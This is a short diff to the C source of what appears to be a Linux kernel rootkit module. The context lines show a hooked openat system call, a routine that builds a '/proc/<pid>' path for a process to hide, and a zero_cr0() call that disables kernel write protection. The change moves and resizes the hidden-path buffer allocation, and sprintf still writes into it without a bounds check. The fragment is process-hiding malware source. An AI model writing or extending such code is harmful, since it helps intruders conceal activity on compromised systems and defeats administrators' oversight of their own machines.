@@ -56,8 +56,6 @@ int new_openat(const struct pt_regs *regs) {
 
 void initialize_path_to_hide(void) {
     char proc_path[] = "/proc/";
-    int path_to_hide_len = strlen(pid_to_hide) + strlen(proc_path) + 1;
-    path_to_hide = kmalloc(path_to_hide_len, GFP_KERNEL);
     sprintf(path_to_hide, "%s%s", proc_path, pid_to_hide);
 }
 
@@ -68,6 +66,7 @@ int load(void) {
     }
 
     printk(KERN_ALERT "Initializing...");
+    path_to_hide = kmalloc(PATH_MAX, GFP_KERNEL);
     initialize_path_to_hide();
 
     zero_cr0();
